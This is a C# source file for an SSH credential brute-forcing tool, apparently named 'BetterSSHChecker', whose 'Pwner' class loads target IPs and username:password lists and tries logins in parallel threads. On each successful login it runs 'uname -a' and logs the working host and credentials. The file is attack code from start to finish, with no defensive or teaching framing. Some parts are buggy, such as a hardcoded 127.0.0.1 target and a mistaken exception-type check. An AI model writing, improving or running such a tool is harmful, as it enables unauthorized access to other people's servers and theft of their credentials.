using Renci.SshNet;
using Renci.SshNet.Messages.Connection;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BetterSSHChecker
{
    class Program
    {
        static void Main(string[] args)
        {
            
            Pwner Lord = new Pwner("result.txt", "userpass.txt");
            Lord.check(3000, 5);


            Console.WriteLine("Done");
            Console.ReadKey();

        }


    }


    class Pwner
    {

        private HashSet<string> IPS = new HashSet<string>();
        private HashSet<Credentials> credentials = new HashSet<Credentials>();

        struct Credentials
        {
            public string username;
            public string password;

            public Credentials(string username, string password)
            {
                this.username = username;
                this.password = password;
            }
        }

        public class SshResponse
        {
            public Exception Exeception;
            public string uname;
        }
       
        public Pwner(string target_file, string credentials_file)
        {

            import(target_file, credentials_file);
            Prelude();

        }

        public void import(string target_file, string credentials_file)
        {
            Stopwatch w = new Stopwatch();
            logIt("Importing...");

            w.Start();
                getData<string>(target_file, IPS);
                getData<Credentials>(credentials_file, credentials);
            w.Stop();

            logIt($"Importated {IPS.Count + credentials.Count} lines in: {w.ElapsedMilliseconds}ms");

        }

        public void Prelude()
        {
            logIt($"Looking for {IPS.Count}*{credentials.Count}:{IPS.Count * credentials.Count} attempts.");
        }
        
        public List<HashSet<string>> splitHashSet(HashSet<string> toExplode, int explodeNumber)
        {

            /*
             * splitHashSet returns a List of HashSet containing explodedNumber of toExplode partitions.
             */

            List<HashSet<string>> explodedResult = new List<HashSet<string>>();
            
            HashSet<string> tmp = new HashSet<string>();

            explodeNumber = IPS.Count / explodeNumber;

            int i = 0;
            foreach (string line in toExplode)
            {

                tmp.Add(line);
                i++;

                if (i == explodeNumber)
                {
                    explodedResult.Add(tmp);
                    tmp = new HashSet<string>();
                    i = 0;
                }


            }
            
            return explodedResult;

        }

        public void check(int timeout, int threads)
        {
            
            Stopwatch w = new Stopwatch();

            threads = 20;
            List<HashSet<string>> b = splitHashSet(IPS, threads);
            logIt($"{IPS.Count * credentials.Count} attemps / {threads}: {IPS.Count * credentials.Count / threads} per threads");
            w.Start();


            /*
             * Method 1: n/threads
             * 500 IPS, 100ms   =   180482ms
             */

            Task[] tasks = new Task[b.Count];
            Console.WriteLine(b.Count);
            foreach (HashSet<string> currentSet in b)
            {

                Task v = new Task(() => {
                        int currentThread = (int)Task.CurrentId;
                        logIt($"Thread {currentThread} started!");

                        // Peach = 30457ms - 4466ms
                        // Each  = 31449ms - 4003ms - 354327ms

                        foreach (Credentials cred in credentials)
                        {
                            foreach (string IP in currentSet)
                            {
                                SshResponse a = meet("127.0.0.1", cred.username, cred.password, 3000);

                                if (!(a.Exeception is null))
                                {
                                    
                                    switch (a.GetType().ToString())
                                    {

                                        case "Renci.SshNet.Common.SshOperationTimeoutException":
                                            logIt($"{IP} is off!", currentThread, false);
                                            continue;
                                            break;

                                        case "System.Net.Sockets.SocketException":
                                            logIt($"{IP} gone oopsy! \n::{a.Exeception.Message}", currentThread, false);
                                            break;

                                        default:
                                            logIt($"{IP}@{cred.username}:{cred.password}", currentThread, false);
                                            continue;
                                            break;

                                    }

                                    // Invalid IP
                                    break;
                                }

                                logIt($"{IP}@{cred.username}:{cred.password} \n-> {a.uname}", currentThread, true);
                                Console.Beep();
                                // Next
                                break;
                            }
                        }
                        
                });

                v.Start();
                tasks[v.Id-1] = v;
            }
            

            Task.WaitAll(tasks);
            w.Stop();

            logIt($"Exec {w.ElapsedMilliseconds}ms");

        }

        public void getData<T>(string source, HashSet<T> destination)
        {
  

            using (StreamReader sr = File.OpenText(source))
            {
                string[] splitted;
                string s = String.Empty;
                while ((s = sr.ReadLine()) != null)
                {
                    if (typeof(T) == typeof(Credentials))
                    {
                        try
                        {
                            splitted = s.Split(':');
                            destination.Add((T)(object)new Credentials(splitted[0], splitted[1]));
                        }
                        catch (Exception) { }

                    } else
                    {
                        destination.Add((T)(object)s);
                    }

                }
            }



        }

        SshResponse meet(string targetIP, string user, string pass, int timeout)
        {


            SshResponse response = new SshResponse();

            try
            {

                using (var client = new SshClient(targetIP, user, pass))
                {
                    client.ConnectionInfo.Timeout = TimeSpan.FromMilliseconds(timeout);
                    client.Connect();
                
                    SshCommand runcommand = client.CreateCommand("uname -a");
                    runcommand.CommandTimeout = TimeSpan.FromMilliseconds(10000);
                    response.uname = runcommand.Execute(); ;
                    
                    client.Disconnect();
                }

            }
            catch (Exception wank)
            {
                //System.Net.Sockets.SocketException
                //Renci.SshNet.Common.SshOperationTimeoutException
                response.Exeception = wank;
            }

            return response;
            
        }

        public void logIt(string message)
        {
            Console.WriteLine("[{0}] {1}", DateTime.Now.ToString("hh:mm:ss"), message);
        }

        public void logIt(string message, int thread, bool success)
        {
            Console.WriteLine("[{0}]#T{1}({2}) {3}", DateTime.Now.ToString("hh:mm:ss"), thread, success ? "+" : "-", message);
        }

    }

}
